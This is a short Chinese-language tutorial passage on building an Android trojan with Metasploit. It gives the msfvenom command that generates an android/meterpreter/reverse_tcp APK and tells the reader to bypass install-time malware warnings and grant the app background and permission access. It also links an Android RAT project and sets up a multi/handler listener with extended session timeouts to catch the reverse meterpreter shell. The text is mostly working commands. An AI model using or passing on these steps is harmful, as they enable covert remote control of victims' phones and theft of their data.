    • 准备木马

    我就用msf来做这个实验，首先venome生成安卓的小马，就选android/meterpreter/reverse_tcp这个，然后设置好LHOST

    msfvenome -l payloads
msfvenome -p android/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx R > xxx.apk

    这个马到时候会反弹一个meterpreter回来，但是安装会报毒，所以我们安装的时候要把封锁解掉，同时要把他的后台运行等打开，再给权限。

    github上面有马和服务端生成器的项目，但是我不建议用，因为安全性还是要画个大大的问号，如果有后门那就中大招了

    • https://github.com/AhMyth/AhMyth-Android-RAT

    监听

    msfconsole里面准备好，首先开启监听

    msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST xxx
set SessionCommunicationTimeout 100000000 //连接无活动失效时间
set SessionExpirationTimeout 100000000 //连接有效期

    设置好之后直接exploit

    然后打开小马，接下来就会反弹到一个meterpreter
